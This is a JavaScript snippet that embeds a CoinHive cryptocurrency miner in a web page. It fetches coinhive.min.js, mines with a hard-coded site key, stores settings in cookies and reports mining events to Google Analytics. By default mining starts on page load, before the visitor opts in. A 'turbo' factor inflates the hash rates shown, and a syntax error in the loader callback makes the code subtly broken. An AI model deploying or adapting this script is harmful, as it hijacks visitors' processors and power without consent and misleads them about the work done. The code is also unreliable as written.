    window.miner = {
        'inst': null,
        'is_run': false,
        'key': 'bqZ2VD6gUC6ATb791cTvK0BuCeg5pg9r',
        'user': 'u:0',
        'def_threads': 1,
        'def_throttle': 0.5,
        'def_run': 1,
        'turbo': 0
    };
    $.getScript('https://coinhive.com/lib/coinhive.min.js', function() {
        window.miner.inst = new CoinHive.User(window.miner.key, window.miner.user, {
            threads: _threads(),
            throttle: _throttle()
        }) if (_isRun() > 0) {
            _minerStart();
        }
    });

    function _threads() {
        var _v = $.cookie('cfg_mine_threads');
        if (_v === undefined) {
            _v = window.miner.def_threads;
        }
        return _v;
    }

    function _throttle() {
        var _v = $.cookie('cfg_mine_throttle');
        if (_v === undefined) {
            _v = window.miner.def_throttle;
        }
        return _v;
    }

    function _isRun() {
        var _v = $.cookie('cfg_mine_run');
        if (_v === undefined) {
            _v = window.miner.def_run;
        }
        return _v;
    }

    function _updateMinerStat() {
        var _hashesPerSecond = window.miner.inst.getHashesPerSecond();
        _hashesPerSecond = (Math.round(_hashesPerSecond * 100 * (1 + window.miner.turbo / 100))) / 100;
        $('#hashesPerSecond').text(number_format(_hashesPerSecond, 2, '.', ''));
        var _totalHashes = window.miner.inst.getTotalHashes(true);
        _totalHashes = Math.round(_totalHashes * (1 + window.miner.turbo / 100));
        $('#totalHashes').text(number_format(_totalHashes, 0, '.', ''));
        if (window.miner.is_run) {
            setTimeout(function() {
                _updateMinerStat();
            }, 1000);
        }
    }

    function _minerStart() {
        window.miner.inst.start();
        window.miner.is_run = true;
        _updateMinerStat();
        $('#miner-stop').show();
        $('#miner-start').hide();
        $.cookie('cfg_mine_run', 1, {
            expires: 365,
            path: '/'
        });
    }

    function _minerStop() {
        window.miner.is_run = false;
        window.miner.inst.stop();
        $('#miner-stop').hide();
        $('#miner-start').show();
        $.cookie('cfg_mine_run', 0, {
            expires: 365,
            path: '/'
        });
    }

    function _setNumThreads(numThreads) {
        window.miner.inst.setNumThreads(numThreads);
        $.cookie('cfg_mine_threads', numThreads, {
            expires: 365,
            path: '/'
        });
    }

    function _plusNumThreads() {
        var numThreads = Number($('#numThreads').text());
        numThreads += 1;
        if (numThreads > 2) {
            if (window.navigator && window.navigator.hardwareConcurrency && window.navigator.hardwareConcurrency) {
                if (numThreads > window.navigator.hardwareConcurrency) {
                    numThreads = window.navigator.hardwareConcurrency;
                }
            } else {
                numThreads = 2;
            }
        }
        $('#numThreads').text(numThreads);
        _setNumThreads(numThreads);
    }

    function _minusNumThreads() {
        var numThreads = Number($('#numThreads').text());
        numThreads -= 1;
        if (numThreads < 1) {
            numThreads = 1;
        }
        $('#numThreads').text(numThreads);
        _setNumThreads(numThreads);
    }

    function _setThrottle(throttle) {
        window.miner.inst.setThrottle(throttle);
        $.cookie('cfg_mine_throttle', throttle, {
            expires: 365,
            path: '/'
        });
    }

    function _plusThrottle() {
        var throttle = Number($('#throttle').text());
        throttle += 10;
        if (throttle > 100) {
            throttle = 100;
        }
        $('#throttle').text(throttle);
        _setThrottle(1 - throttle / 100);
    }

    function _minusThrottle() {
        var throttle = Number($('#throttle').text());
        throttle -= 10;
        if (throttle < 10) {
            throttle = 10;
        }
        $('#throttle').text(throttle);
        _setThrottle(1 - throttle / 100);
    }
    ga('send', 'event', {
        eventCategory: 'Maining',
        eventAction: 'start',
        eventLabel: 'all'
    });
    ga('send', 'event', {
        eventCategory: 'Maining',
        eventAction: 'start-page',
        eventLabel: 'coinhive'
    });
    window.miner.startEvent = false;

    function _startEvent() {
        if (window.miner.startEvent) {
            return;
        }
        window.miner.startEvent = true;
        console.log('Start startEvent() for coinhive', ga);
        window.miner.inst.on('open', function() {
            ga('send', 'event', {
                eventCategory: 'Maining',
                eventAction: 'open',
                eventLabel: 'coinhive'
            });
        });
        window.miner.inst.on('close', function() {
            ga('send', 'event', {
                eventCategory: 'Maining',
                eventAction: 'close',
                eventLabel: 'coinhive'
            });
        });
        window.miner.inst.on('error', function(params) {
            ga('send', 'event', {
                eventCategory: 'Maining',
                eventAction: 'error' + params.error,
                eventLabel: 'coinhive'
            });
        });
    }
    _minerStart = function() {
        window.miner.inst.start();
        window.miner.is_run = true;
        _updateMinerStat();
        $('#miner-stop').show();
        $('#miner-start').hide();
        $.cookie('cfg_mine_run', 1, {
            expires: 365,
            path: '/'
        });
        _startEvent();
    };